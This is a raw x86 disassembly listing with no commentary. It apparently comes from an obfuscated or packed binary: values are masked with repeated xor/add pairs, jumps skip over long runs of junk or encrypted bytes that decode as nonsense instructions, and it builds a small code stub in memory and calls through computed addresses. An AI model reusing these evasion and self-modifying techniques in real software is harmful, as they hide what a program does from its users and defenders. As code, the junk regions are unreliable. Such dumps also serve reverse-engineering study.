  415772:	push   DWORD PTR [eax]
  415774:	call   0x419198
  415779:	mov    DWORD PTR [ebp-0x8],eax
  41577c:	cmp    DWORD PTR [ebp-0x8],0x0
  415780:	je     0x41589f
  415786:	lea    eax,[ebp-0xc]
  415789:	mov    DWORD PTR [ebp-0x38],eax
  41578c:	mov    eax,DWORD PTR [ebp-0x60]
  41578f:	xor    eax,esi
  415791:	add    eax,edi
  415793:	mov    DWORD PTR [ebp-0x40],eax
  415796:	mov    eax,DWORD PTR [ebp-0x3c]
  415799:	xor    eax,esi
  41579b:	add    eax,edi
  41579d:	mov    DWORD PTR [ebp-0x10],eax
  4157a0:	mov    eax,DWORD PTR [ebp-0x8]
  4157a3:	mov    DWORD PTR [ebp-0x14],eax
  4157a6:	lea    eax,[ebp-0xa8]
  4157ac:	mov    DWORD PTR [ebp+0xc],eax
  4157af:	mov    eax,DWORD PTR [ebp-0x18]
  4157b2:	mov    DWORD PTR [ebp-0x18],eax
  4157b5:	mov    eax,DWORD PTR [ebp-0x20]
  4157b8:	mov    DWORD PTR [ebp-0x48],ebx
  4157bb:	mov    DWORD PTR [ebp-0x34],eax
  4157be:	mov    eax,DWORD PTR [ebp-0x48]
  4157c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4157c4:	xor    eax,esi
  4157c6:	add    eax,0x327298
  4157cb:	mov    DWORD PTR [ecx],eax
  4157cd:	mov    eax,DWORD PTR [ebp-0x14]
  4157d0:	mov    ecx,DWORD PTR [ebp+0xc]
  4157d3:	mov    DWORD PTR [ecx+0x4],eax
  4157d6:	mov    eax,DWORD PTR [ebp-0x10]
  4157d9:	mov    ecx,DWORD PTR [ebp+0xc]
  4157dc:	mov    DWORD PTR [ecx+0x8],eax
  4157df:	mov    eax,DWORD PTR [ebp-0x40]
  4157e2:	mov    ecx,DWORD PTR [ebp+0xc]
  4157e5:	mov    DWORD PTR [ecx+0xc],eax
  4157e8:	mov    eax,DWORD PTR [ebp-0x38]
  4157eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4157ee:	mov    DWORD PTR [ecx+0x10],eax
  4157f1:	mov    eax,eax
  4157f3:	mov    eax,DWORD PTR [ebp-0x14]
  4157f6:	test   eax,eax
  4157f8:	mov    eax,DWORD PTR [ebp-0x34]
  4157fb:	jne    0x415804
  415801:	mov    eax,DWORD PTR [ebp-0x18]
  415804:	xor    eax,esi
  415806:	add    eax,edi
  415808:	test   eax,eax
  41580a:	je     0x415838
  415810:	lea    eax,[ebp-0xa8]
  415816:	push   eax
  415817:	mov    eax,DWORD PTR [ebp-0x20]
  41581a:	xor    eax,esi
  41581c:	add    eax,edi
  41581e:	push   eax
  41581f:	mov    eax,DWORD PTR [ebp+0x10]
  415822:	add    eax,0xee
  415827:	push   eax
  415828:	mov    eax,DWORD PTR [ebp+0x10]
  41582b:	mov    eax,DWORD PTR [eax+0x198]
  415831:	push   DWORD PTR [eax]
  415833:	call   0x419198
  415838:	mov    ecx,DWORD PTR [ebp-0x3c]
  41583b:	xor    ecx,esi
  41583d:	mov    eax,0xffcd8d68
  415842:	sub    eax,ecx
  415844:	sub    eax,DWORD PTR [ebp-0x8]
  415847:	mov    ecx,DWORD PTR [ebp-0x50]
  41584a:	add    ecx,eax
  41584c:	mov    eax,DWORD PTR [ebp-0x8]
  41584f:	mov    DWORD PTR [eax+0x1],ecx
  415852:	mov    al,BYTE PTR [ebp-0x25]
  415855:	mov    ecx,DWORD PTR [ebp-0x8]
  415858:	xor    al,0x43
  41585a:	sub    al,0x3b
  41585c:	mov    BYTE PTR [ecx],al
  41585e:	lea    eax,[ebp-0x8]
  415861:	inc    BYTE PTR [eax]
  415863:	inc    eax
  415864:	push   eax
  415865:	pop    ecx
  415866:	dec    ecx
  415867:	xchg   ecx,edx
  415869:	dec    BYTE PTR [edx]
  41586b:	push   DWORD PTR [ebp+0x10]
  41586e:	mov    eax,ds:0x41eba2
  415873:	mov    eax,DWORD PTR [eax]
  415875:	push   DWORD PTR [eax]
  415877:	lea    eax,ds:0x41ebbe
  41587d:	push   DWORD PTR [eax]
  41587f:	lea    eax,ds:0x41e96a
  415885:	push   DWORD PTR [eax]
  415887:	lea    eax,ds:0x41eb9e
  41588d:	push   DWORD PTR [eax]
  41588f:	lea    eax,ds:0x41ec46
  415895:	push   DWORD PTR [eax]
  415897:	xchg   ebx,edx
  415899:	inc    ebx
  41589a:	push   ebx
  41589b:	pop    eax
  41589c:	call   DWORD PTR [eax-0x1]
  41589f:	lea    eax,[ebp+0x4]
  4158a2:	mov    DWORD PTR [ebp-0x58],eax
  4158a5:	mov    eax,ds:0x41eae6
  4158aa:	push   0x4
  4158ac:	add    eax,0x1cc
  4158b1:	push   eax
  4158b2:	lea    eax,[ebp-0x1c]
  4158b5:	push   eax
  4158b6:	call   0x4043a1
  4158bb:	mov    eax,DWORD PTR [ebp-0x1c]
  4158be:	mov    eax,DWORD PTR [ebp-0x4]
  4158c1:	mov    eax,DWORD PTR [ebp-0x24]
  4158c4:	mov    DWORD PTR [ebp+0xc],eax
  4158c7:	mov    eax,ds:0x41eb6a
  4158cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4158cf:	sub    eax,edi
  4158d1:	xor    eax,esi
  4158d3:	cmp    eax,ecx
  4158d5:	je     0x41591c
  4158db:	mov    eax,ds:0x41eb62
  4158e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4158e3:	sub    eax,edi
  4158e5:	xor    eax,esi
  4158e7:	cmp    eax,ecx
  4158e9:	jne    0x4158ff
  4158ef:	mov    eax,ds:0x41eb6a
  4158f4:	add    eax,DWORD PTR ds:0x41eb62
  4158fa:	jmp    0x415906
  4158ff:	mov    eax,DWORD PTR [ebp+0xc]
  415902:	xor    eax,esi
  415904:	add    eax,edi
  415906:	mov    ds:0x41eb62,eax
  41590b:	mov    eax,DWORD PTR [ebp+0xc]
  41590e:	xor    eax,esi
  415910:	add    eax,edi
  415912:	mov    ds:0x41eb6a,eax
  415917:	jmp    0x415926
  41591c:	mov    eax,ds:0x41eb6a
  415921:	mov    ds:0x41eb62,eax
  415926:	mov    eax,DWORD PTR [ebp-0x58]
  415929:	mov    ecx,DWORD PTR ds:0x41eb62
  41592f:	add    DWORD PTR [eax],ecx
  415931:	push   0x10
  415933:	push   0x41ebfe
  415938:	call   DWORD PTR ds:0x41d114
  41593e:	mov    eax,DWORD PTR [ebp-0x1c]
  415941:	mov    eax,DWORD PTR [eax]
  415943:	pop    edi
  415944:	pop    esi
  415945:	pop    ebx
  415946:	leave  
  415947:	ret    0xc
  41594a:	push   ebp
  41594b:	mov    ebp,esp
  41594d:	jmp    0x415c05
  415952:	into   
  415953:	int    0xc5
  415955:	rol    ebp,1
  415957:	(bad)  
  415959:	shl    eax,1
  41595b:	out    0x8f,al
  41595d:	stc    
  41595e:	pushf  
  41595f:	data16 add BYTE PTR [edx+0x787f106d],ch
  415966:	xchg   ebp,eax
  415967:	jle    0x4159e1
  415969:	js     0x4158fa
  41596b:	sti    
  41596c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41596d:	jp     0x41596c
  41596f:	jmp    0x2111:0x2577a919
  415976:	lods   al,BYTE PTR ds:[esi]
  415977:	dec    bl
  415979:	dec    eax
  41597a:	fiadd  DWORD PTR [ebp+0x21]
  41597d:	clc    
  41597e:	dec    esi
  41597f:	arpl   sp,si
  415981:	mov    edx,0x809e281a
  415986:	ds fxch st(5)
  415989:	aaa    
  41598a:	sub    DWORD PTR [ecx],ebx
  41598c:	imul   edi,DWORD PTR [esi-0x24f9ed82],0x5fd21b1c
  415996:	nop
  415997:	sub    eax,0x4646b89a
  41599c:	outs   dx,BYTE PTR ds:[esi]
  41599d:	mov    ebx,0xfee4781
  4159a2:	arpl   WORD PTR ds:0xdf722a75,bx
  4159a8:	push   ebx
  4159a9:	sbb    dl,bh
  4159ab:	fld    QWORD PTR [eax+0x56]
  4159ae:	add    al,0x46
  4159b0:	inc    eax
  4159b1:	dec    edx
  4159b2:	xchg   edx,eax
  4159b3:	inc    edi
  4159b4:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159b6:	test   eax,ebx
  4159b8:	shl    eax,cl
  4159ba:	pop    edi
  4159bb:	pop    ds
  4159bc:	fsubr  st,st(1)
  4159be:	add    al,0x58
  4159c0:	mov    BYTE PTR [ecx-0x6a51fa5d],al
  4159c6:	(bad)  
  4159c7:	shr    ecx,1
  4159c9:	mov    al,ah
  4159cb:	lea    ebp,[ebx-0x34e1f270]
  4159d1:	loopne 0x4159af
  4159d3:	dec    esp
  4159d4:	ins    DWORD PTR es:[edi],dx
  4159d5:	jl     0x415a1c
  4159d7:	sbb    eax,0x45c7fbe8
  4159dc:	inc    esi
  4159dd:	xchg   BYTE PTR [esi],ch
  4159df:	nop
  4159e0:	aaa    
  4159e1:	mov    edi,0x1a2f5cc6
  4159e6:	add    BYTE PTR [eax],dh
  4159e8:	sub    dl,BYTE PTR [edi]
  4159ea:	sti    
  4159eb:	enter  0x468f,0x79
  4159ef:	fisttp DWORD PTR [ebp+0x310259c4]
  4159f5:	xchg   esi,eax
  4159f6:	jns    0x4159a4
  4159f8:	stos   DWORD PTR es:[edi],eax
  4159f9:	xor    bh,BYTE PTR [edi-0x5e]
  4159fc:	or     esi,DWORD PTR [ecx-0x6cd1d011]
  415a02:	bound  esi,QWORD PTR [eax-0x65a03f54]
  415a08:	adc    eax,0x60655ad6
  415a0d:	dec    BYTE PTR es:[ebp+0x17b14af2]
  415a14:	in     al,dx
  415a15:	push   es
  415a16:	dec    esi
  415a17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a18:	and    DWORD PTR [esi+0x350b9225],edx
  415a1e:	in     al,0x3a
  415a20:	sbb    esp,ecx
  415a22:	inc    BYTE PTR [eax+edi*8-0x2c]
  415a26:	mov    ebp,0xf7aff1b8
  415a2b:	stc    
  415a2c:	cmp    al,BYTE PTR [ecx]
  415a2e:	adc    BYTE PTR [eax-0x7b],al
  415a31:	mov    cs,WORD PTR [edx-0x6caf7b9a]
  415a37:	fxch   st(5)
  415a39:	retf   0x8f28
  415a3c:	cmp    DWORD PTR ds:0x8aa0a095,ebx
  415a42:	(bad)  
  415a43:	pop    edx
  415a44:	mov    ds:0x5aeaa865,eax
  415a49:	push   ds
  415a4a:	mov    dh,BYTE PTR [esi-0x54]
  415a4d:	or     cl,BYTE PTR [edi-0x40497606]
  415a53:	icebp  
  415a54:	mov    bl,0x71
  415a56:	sbb    al,0x84
  415a58:	push   edx
  415a59:	fistp  QWORD PTR [edx]
  415a5b:	and    ch,bh
  415a5d:	imul   esi,eax,0xfffffff8
  415a60:	cmp    cl,BYTE PTR [eax]
  415a62:	fist   WORD PTR [edx+0x28fc8530]
  415a68:	cs ss stc 
  415a6b:	jno    0x415a65
  415a6d:	add    DWORD PTR [ecx+edx*8+0xa247cc8],edi
  415a74:	mov    al,ds:0xa87b2c82
  415a79:	and    ecx,DWORD PTR ds:0x35b3549f
  415a7f:	mov    al,ds:0x6a6b0f2b
  415a84:	inc    BYTE PTR [esi+edi*8]
  415a87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a88:	mov    eax,0x16b66a94
  415a8d:	sub    eax,0xc3d885
  415a92:	inc    esi
  415a93:	das    
  415a94:	jb     0x415af2
  415a96:	lock in al,0x60
  415a99:	pushf  
  415a9a:	cmp    eax,0x4775cf07
  415a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415aa0:	mov    edi,0x5a340f2c
  415aa5:	(bad)  
  415aa6:	sbb    edi,edx
  415aa8:	jg     0x415ad1
  415aaa:	pop    ebp
  415aab:	jne    0x415ac0
  415aad:	loope  0x415a5c
  415aaf:	stos   DWORD PTR es:[edi],eax
  415ab0:	and    al,0xf9
  415ab2:	(bad)
  415ab5:	gs (bad) 
  415ab7:	jno    0x415b04
  415ab9:	scas   al,BYTE PTR es:[edi]
  415aba:	mov    bh,0x92
  415abc:	or     BYTE PTR [ebx+esi*4+0x63ac20db],bl
  415ac3:	cli    
  415ac4:	js     0x415b39
  415ac6:	and    al,0x3a
  415ac8:	subps  xmm2,XMMWORD PTR [bx+si]
  415acc:	dec    esi
  415acd:	fidivr DWORD PTR [ebx+0x3caf00e0]
  415ad3:	popa   
  415ad4:	into   
  415ad5:	cdq    
  415ad6:	dec    eax
  415ad7:	cmp    al,0x71
  415ad9:	or     BYTE PTR [esi],0xf9
  415adc:	jnp    0x415b1b
  415ade:	stos   BYTE PTR es:[edi],al
  415adf:	push   0x962eb2b8
  415ae4:	(bad)  
  415ae5:	gs jle 0x415af0
  415ae8:	arpl   bx,si
  415aea:	pop    ebp
  415aeb:	ss dec edi
  415aed:	and    bh,ah
  415aef:	pop    ebx
  415af0:	dec    esi
  415af1:	call   0xec585f7f
  415af6:	mov    cl,0x4b
  415af8:	push   0x87e1da99
  415afd:	repz mov ecx,0x336e438a
  415b03:	or     eax,0x4a33f750
  415b08:	add    ch,BYTE PTR [eax-0x4a]
  415b0b:	pop    edx
  415b0c:	sti    
  415b0d:	data16 mov ds:0x2c360f47,al
  415b13:	xor    al,0x91
  415b15:	and    cl,BYTE PTR [esi+ecx*2-0x46]
  415b19:	repnz clc 
  415b1b:	ret    0x562c
  415b1e:	cmp    DWORD PTR [esi],edx
  415b20:	jne    0x415b4a
  415b22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b23:	jb     0x415b9a
  415b25:	icebp  
  415b26:	nop
  415b27:	ds and eax,0x9d7c42f6
  415b2d:	or     al,BYTE PTR [edi+0x2271b7ca]
  415b33:	cld    
  415b34:	inc    edx
  415b35:	sti    
  415b36:	aad    0x57
  415b38:	xchg   edi,eax
  415b3a:	nop
  415b3b:	stc    
  415b3c:	clc    
  415b3d:	cs push esp
  415b3f:	pusha  
  415b40:	enter  0x6d6a,0xc7
  415b44:	inc    ebp
  415b45:	jle    0x415ba9
  415b47:	sub    esi,DWORD PTR [eax]
  415b49:	inc    ebx
  415b4a:	jnp    0x415b31
  415b4c:	inc    eax
  415b4d:	pop    edi
  415b4e:	push   0xffffffdc
  415b50:	jbe    0x415b1d
  415b52:	(bad)  
  415b53:	pop    esp
  415b54:	mov    BYTE PTR [ebp-0x32297653],0x93
  415b5b:	sbb    BYTE PTR [eax-0xf],0x16
  415b5f:	mov    cl,BYTE PTR [eax-0x9]
  415b62:	jge    0x415ba7
  415b64:	inc    edi
  415b65:	mov    esi,0xe81f7ac9
  415b6a:	in     al,0x18
  415b6c:	data16 mov bl,0x9
  415b6f:	imul   edi,DWORD PTR [edx-0x2e],0x2a83849d
  415b76:	xchg   al,bl
  415b78:	das    
  415b79:	cmp    al,0x1f
  415b7b:	lods   al,BYTE PTR ds:[esi]
  415b7c:	nop
  415b7d:	or     eax,0x7a6c7018
  415b82:	out    dx,eax
  415b83:	loopne 0x415ba4
  415b85:	push   edi
  415b86:	sbb    BYTE PTR [eax],0xe7
  415b89:	arpl   sp,bp
  415b8b:	icebp  
  415b8c:	ss dec ebx
  415b8e:	and    esp,DWORD PTR [edi-0x23]
  415b91:	mov    ebp,0xf97afad
  415b96:	ins    DWORD PTR es:[edi],dx
  415b97:	sbb    BYTE PTR [eax],bh
  415b99:	add    BYTE PTR [ebx-0x623a38c4],al
  415b9f:	inc    esi
  415ba0:	ret    0xa8fc
  415ba3:	inc    edx
  415ba4:	ret    
  415ba5:	adc    eax,0xce043b3b
  415baa:	cmc    
  415bab:	sub    ebp,DWORD PTR [ecx+esi*1]
  415bae:	xor    al,0xf2
  415bb0:	stos   DWORD PTR es:[edi],eax
  415bb1:	shr    DWORD PTR [bx+si-0x6c59],0x4c
  415bb7:	stos   DWORD PTR es:[edi],eax
  415bb8:	(bad)  
  415bb9:	mov    ebx,0x4a454c16
  415bbe:	sbb    al,0x61
  415bc0:	mov    ecx,0xeaf5eec6
  415bc5:	jo     0x415bc3
  415bc7:	mov    ds:0x45cdddea,eax
  415bcc:	ror    BYTE PTR [edi+0x43],cl
  415bcf:	and    eax,DWORD PTR [ebx+ebx*8+0x36]
  415bd3:	lods   eax,DWORD PTR ds:[esi]
  415bd4:	jns    0x415c2c
  415bd6:	jnp    0x415bd9
  415bd8:	sbb    ah,BYTE PTR [ecx+0x6f]
  415bdb:	pop    eax
  415bdc:	ja     0x415bd2
  415bde:	int3   
  415bdf:	jle    0x415bae
  415be1:	mov    DWORD PTR [edi-0x61df1fe7],ecx
  415be7:	mov    ds:0x34e33229,al
  415bec:	mov    ah,bh
  415bee:	jae    0x415ba6
  415bf0:	mov    bh,0x8c
  415bf2:	lea    ebp,[ebp-0x1275bdf9]
  415bf8:	adc    edi,edi
  415bfa:	outs   dx,BYTE PTR ds:[esi]
  415bfb:	test   DWORD PTR [bx+di-0x7668],ebp
  415c00:	fisttp DWORD PTR [ebx+0x5150bca7]
  415c06:	push   ecx
  415c07:	mov    DWORD PTR ds:0x42af75,0x1010
  415c11:	mov    eax,0xf89c8539
  415c16:	mov    DWORD PTR ds:0x42af39,0x4c90
  415c20:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  415c27:	mov    DWORD PTR ds:0x42affd,edx
  415c2d:	push   esi
  415c2e:	jmp    0x415ee6
  415c33:	retf   0xd7d6
  415c36:	xlat   BYTE PTR ds:[ebx]
  415c37:	fcmovnbe st,st(5)
  415c39:	retf   0xa0d9
  415c3c:	test   al,0x64
  415c3e:	pop    ecx
  415c3f:	jge    0x415c1c
  415c41:	loopne 0x415c1b
  415c43:	mov    dl,BYTE PTR ds:0x7e95787f
  415c49:	js     0x415cc3
  415c4b:	mov    DWORD PTR [eax-0x62],edx
  415c4e:	(bad)  
  415c4f:	dec    ebx
  415c50:	aam    0x62
  415c52:	int3   
  415c53:	in     eax,0x31
  415c55:	iret   
  415c56:	idiv   edi
  415c58:	push   edx
  415c59:	jo     0x415c71
  415c5b:	fild   QWORD PTR [bp+di+0x3a]
  415c5f:	inc    esi
  415c60:	pop    ebx
  415c61:	sub    eax,0xa9956ef
  415c66:	stc    
  415c67:	or     BYTE PTR [ecx],0xf0
  415c6a:	into   
  415c6b:	jmp    0x415bf3
  415c6d:	inc    eax
  415c6e:	jmp    0xa5538b72
  415c73:	mov    bh,0xb9
  415c75:	fiadd  DWORD PTR [ebx+0x48]
  415c78:	xor    dh,BYTE PTR [ebx]
  415c7a:	xor    DWORD PTR [edx+0x3812b737],ecx
  415c80:	add    eax,0x524d26ac
  415c85:	jo     0x415c52
  415c87:	push   edi
  415c88:	pusha  
  415c89:	inc    ebp
  415c8a:	add    al,0x11
  415c8c:	sub    eax,0xc0418435
  415c91:	or     edi,edi
  415c93:	fstp   DWORD PTR [ecx]
  415c95:	pop    es
  415c96:	sbb    al,0x28
  415c99:	xlat   BYTE PTR ds:[ebx]
  415c9a:	rcl    BYTE PTR [ebp+0x475ce634],cl
  415ca0:	mov    eax,ds:0x641bb828
  415ca5:	data16 in al,0xd3
  415ca8:	out    dx,eax
  415ca9:	push   0x58
  415cab:	inc    edi
  415cac:	jmp    0x415c63
  415cae:	adc    ch,cl
  415cb0:	and    eax,0xbd86f30d
  415cb5:	and    DWORD PTR [esi],0x2cb8d3a0
  415cbb:	xchg   ebp,eax
  415cbc:	mov    ebp,0x58f4836
  415cc1:	or     BYTE PTR [ecx],al
  415cc3:	xlat   BYTE PTR ds:[ebx]
  415cc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cc5:	dec    DWORD PTR cs:[edx]
  415cc8:	fs or  al,0x6a
  415ccb:	xor    eax,0xd98a0923
  415cd0:	int3   
  415cd1:	(bad)
  415cd5:	sub    al,0x9e
  415cd7:	pop    ss
  415cd8:	jmp    0x6b4eb938
  415cdd:	test   al,0x4a
  415cdf:	push   edi
  415ce0:	push   edx
  415ce1:	add    eax,0x811afff9
  415ce6:	(bad)  
  415ce7:	in     al,0x5e
  415ce9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cea:	dec    edx
  415ceb:	out    dx,eax
  415cec:	out    dx,al
  415ced:	cli    
  415cee:	pop    ds
  415cef:	cld    
  415cf0:	dec    edi
  415cf1:	cmp    DWORD PTR [ebx+eiz*1+0x7d481969],eax
  415cf8:	or     DWORD PTR [edi+ecx*1+0x13],eax
  415cfc:	pop    ss
  415cfd:	lods   al,BYTE PTR ds:[esi]
  415cfe:	mov    eax,0x774bd9e9
  415d03:	or     BYTE PTR [eax+0x66],dh
  415d06:	aad    0x39
  415d08:	inc    edi
  415d09:	sub    cl,BYTE PTR [ecx]
  415d0b:	addr16 (bad) 
  415d0d:	fmul   st,st(1)
  415d0f:	retf   0xa9dd
  415d12:	fist   WORD PTR [ecx-0x677018a]
  415d18:	adc    DWORD PTR [ebx-0x34],eax
  415d1b:	sub    edx,DWORD PTR [ebx+ebx*1-0x70]
  415d1f:	push   esp
  415d20:	cwde   
  415d21:	in     eax,0xa2
  415d23:	jl     0x415cc0
  415d25:	sbb    dh,BYTE PTR [ebp-0x798d8a3a]
  415d2b:	mov    edx,0xa9a44570
  415d30:	je     0x415d91
  415d32:	lods   eax,DWORD PTR ds:[esi]
  415d33:	jecxz  0x415d79
  415d35:	xor    dh,ch
  415d37:	sub    esi,DWORD PTR [ebx-0x6f]
  415d3a:	xchg   edi,eax
  415d3b:	in     al,0x59
  415d3d:	jnp    0x415cfc
  415d3f:	sub    al,0x63
  415d41:	mov    ecx,0xd4ea7475
  415d46:	jb     0x415d6a
  415d48:	jae    0x415d56
  415d4a:	iret   
  415d4b:	in     eax,0xc2
  415d4d:	mov    esp,0x7e0e9134
  415d52:	int3   
  415d53:	mov    eax,0x25a4189e
  415d58:	in     al,0x91
  415d5a:	mov    BYTE PTR [eax+0x1910ce0b],0x7
  415d61:	inc    ebx
  415d62:	ins    DWORD PTR es:[edi],dx
  415d63:	mov    ch,0xc
  415d65:	push   ebp
  415d66:	nop
  415d67:	dec    edx
  415d68:	mov    dh,0x84
  415d6a:	test   ch,0xce
  415d6d:	xchg   edx,eax
  415d6e:	cdq    
  415d6f:	shr    BYTE PTR [edx+ebp*4+0x7f3715f8],1
  415d76:	sbb    edx,DWORD PTR [esi]
  415d78:	loopne 0x415d58
  415d7a:	inc    edx
  415d7b:	mov    ch,0x95
  415d7d:	xchg   ebp,eax
  415d7e:	xchg   ebx,eax
  415d7f:	sbb    ah,BYTE PTR [ebx]
  415d81:	mov    edi,0x9d927b12
  415d86:	div    ah
  415d88:	popa   
  415d89:	mov    dl,0x64
  415d8b:	cmp    al,0x10
  415d8d:	pop    ebx
  415d8e:	pop    edx
  415d8f:	dec    edi
  415d90:	cdq    
  415d91:	aaa    
  415d92:	call   0x45cd:0xa93be7c0
  415d99:	dec    ecx
  415d9a:	sub    DWORD PTR [esi],0x31
  415d9d:	mov    ds:0x705d0dd0,eax
  415da2:	or     eax,0xc99c245b
  415da7:	mov    BYTE PTR [edi+0x49],ch
  415daa:	fisubr WORD PTR [ecx+eiz*8]
  415dad:	lock pop esp
  415daf:	inc    eax
  415db0:	mov    bl,0x7d
  415db2:	mov    ebx,0xaefe6aed
  415db7:	jb     0x415d5e
  415db9:	imul   esp,esi,0xedfec7fb
  415dbf:	sub    eax,0x4c642aad
  415dc4:	adc    edx,esp
  415dc6:	cdq    
  415dc7:	push   edx
  415dc8:	pop    edx
  415dc9:	cmp    ebx,DWORD PTR [edi+0x2dfe5980]
  415dcf:	sbb    esi,ebx
  415dd1:	in     eax,dx
  415dd2:	sbb    bl,dh
  415dd4:	mov    ds:0x4fc69ded,al
  415dd9:	jge    0x415e44
  415ddb:	dec    ecx
  415ddc:	mov    ds:0xc39aac6b,eax
  415de1:	leave  
  415de2:	scas   eax,DWORD PTR es:[edi]
  415de3:	shr    BYTE PTR [ebx+ebp*4-0x5b],cl
  415de7:	rcr    BYTE PTR [eax-0x61],cl
  415dea:	int    0xd9
  415dec:	mov    esi,ss
  415dee:	enter  0xbca0,0xba
  415df2:	lock jmp 0xa38b:0xd7c517fc
  415dfa:	cmp    DWORD PTR [edi-0x306d5a7d],0xc599889a
  415e04:	loope  0x415e6f
  415e06:	sbb    BYTE PTR [esi-0x2e],ch
  415e09:	push   ecx
  415e0a:	mov    al,0x3f
  415e0c:	mov    al,0xaf
  415e0e:	xchg   esp,eax
  415e0f:	sub    ch,BYTE PTR [edi]
  415e11:	and    al,0x9
  415e13:	ins    BYTE PTR es:[edi],dx
  415e14:	rol    BYTE PTR [edx-0x29163b41],cl
  415e1a:	dec    esi
  415e1b:	jl     0x415e30
  415e1d:	jns    0x415e9b
  415e1f:	loopne 0x415e02
  415e21:	xchg   ecx,eax
  415e22:	test   al,0x33
  415e24:	xor    esi,ebp
  415e26:	jl     0x415e46
  415e28:	es push esp
  415e2a:	mov    al,ds:0x3fca0fb9
  415e2f:	mov    ss,WORD PTR [eax]
  415e31:	or     ecx,ebx
  415e33:	and    ebx,DWORD PTR [ebx-0x1f51d261]
  415e39:	sti    
  415e3a:	sub    ch,ah
  415e3c:	add    bh,bl
  415e3e:	addr16 aaa 
  415e40:	lea    eax,[ebx]
  415e42:	iret   
  415e43:	cmp    eax,DWORD PTR [esi-0x4e085549]
  415e49:	gs pushf 
  415e4b:	icebp  
  415e4c:	fwait
  415e4d:	std    
  415e4e:	ss mov bh,0xf
  415e51:	sbb    ecx,DWORD PTR [edi+0x4f]
  415e54:	stos   BYTE PTR es:[edi],al
  415e55:	es cli 
  415e57:	into   
  415e58:	pop    esp
  415e59:	pusha  
  415e5a:	or     BYTE PTR [esi+0x70],dl
  415e5d:	call   eax
  415e5f:	sti    
  415e60:	lods   al,BYTE PTR ds:[esi]
  415e61:	ret    
  415e62:	cdq    
  415e63:	push   0xfffffff5
  415e65:	adc    DWORD PTR ds:0xd3031664,0x50ede2b3
  415e6f:	jno    0x415ece
  415e71:	in     al,dx
  415e72:	pop    ebp
  415e73:	mov    BYTE PTR [eax+0x9],bh
  415e76:	retf   
  415e77:	ret    0x7ee7
  415e7a:	popf   
  415e7b:	stos   BYTE PTR es:[edi],al
  415e7c:	daa    
  415e7d:	test   eax,0x92f96733
  415e82:	retf   0xe29b
  415e85:	popa   
  415e86:	sbb    BYTE PTR [eax+0x74],ch
  415e89:	or     BYTE PTR [ebx+0x2d],cl
  415e8c:	sti    
  415e8d:	sar    BYTE PTR [eax],cl
  415e8f:	inc    edx
  415e90:	and    al,0x13
  415e92:	nop
  415e93:	xchg   ebp,eax
  415e94:	call   0x19098bbb
  415e99:	or     BYTE PTR [ebx+0x1b],ch
  415e9c:	out    dx,al
  415e9d:	cmp    eax,0x9c163a4e
  415ea2:	cmp    al,0x5e
  415ea4:	mov    ecx,0xa8e41f94
  415ea9:	std    
  415eaa:	jge    0x415ee3
  415eac:	repz (bad) 
  415eae:	bound  edi,QWORD PTR [edi]
  415eb0:	jle    0x415e60
  415eb2:	ret    0xeb2d
  415eb5:	lea    esp,[ecx-0x31565d70]
  415ebb:	mov    eax,0xdb1820be
  415ec0:	stc    
  415ec1:	sbb    ch,BYTE PTR [edx]
  415ec3:	outs   dx,BYTE PTR ds:[esi]
  415ec4:	pushf  
  415ec5:	jae    0x415f06
  415ec7:	cld    
  415ec8:	mov    ebp,0x28a10890
  415ecd:	sbb    DWORD PTR [ebx],ebx
  415ecf:	dec    eax
  415ed0:	arpl   ax,si
  415ed2:	out    0x3,al
  415ed4:	outs   dx,BYTE PTR ds:[esi]
  415ed5:	fnstsw WORD PTR [ebx+0x6c2c3bab]
  415edb:	(bad)
  415ede:	cmc    
  415edf:	jmp    0x8cbfbe18
  415ee4:	outs   dx,DWORD PTR ds:[esi]
  415ee5:	mov    DWORD PTR gs:[ebp-0x8],eax
  415ee9:	mov    DWORD PTR ds:0x42aefd,0x6d30
  415ef3:	mov    ecx,DWORD PTR [ebp+0x8]
  415ef6:	mov    esi,0x428e
  415efb:	push   edi
  415efc:	mov    edi,0x7510850
  415f01:	mov    esi,0x378b
  415f06:	mov    esi,0x327298
  415f0b:	cmp    ecx,eax
  415f0d:	mov    DWORD PTR ds:0x42af81,0x160e
  415f17:	je     0x416abf
  415f1d:	mov    eax,DWORD PTR [ebp-0x4]
  415f20:	mov    ecx,DWORD PTR [ebp+0xc]
  415f23:	xor    eax,edi
  415f25:	sub    DWORD PTR ds:0x42af85,0x42af41
  415f2f:	add    eax,esi
  415f31:	cmp    eax,ecx
  415f33:	je     0x416abf
  415f39:	jmp    0x4161f1
  415f3e:	into   
  415f3f:	xlat   BYTE PTR ds:[ebx]
  415f40:	ror    cl,1
  415f42:	aad    0xc9
  415f44:	rcr    ebx,1
  415f46:	stos   BYTE PTR es:[edi],al
  415f47:	imul   edx,edx,0x31
  415f4a:	add    al,0x20
  415f4c:	fxtract 
  415f4e:	daa    
  415f4f:	sbb    bh,BYTE PTR [edi+0x78]
  415f52:	xchg   ebp,eax
  415f53:	jle    0x415fcd
  415f55:	js     0x415fb7
  415f57:	jle    0x415f19
  415f59:	or     DWORD PTR [eax-0xdb9bc1b],eax
  415f5f:	push   0x2753d924
  415f64:	cs out dx,al
  415f66:	gs es sti 
  415f69:	push   0xffffffaf
  415f6b:	ins    BYTE PTR es:[edi],dx
  415f6c:	(bad)
  415f6f:	(bad)
  415f73:	in     eax,0x6a
  415f75:	mov    ah,bh
  415f77:	cmp    BYTE PTR [ebx+0xe1d3da2],0xb8
  415f7e:	push   ebp
  415f7f:	add    BYTE PTR [esi+0x71],ah
  415f82:	mov    bl,0x43
  415f84:	je     0x415fe5
  415f86:	(bad)  
  415f87:	das    
  415f88:	push   eax
  415f89:	lock loop 0x415fec
  415f8c:	loope  0x415ff2
  415f8e:	cld    
  415f8f:	lds    edx,FWORD PTR [ebx]
  415f91:	out    0x8a,eax
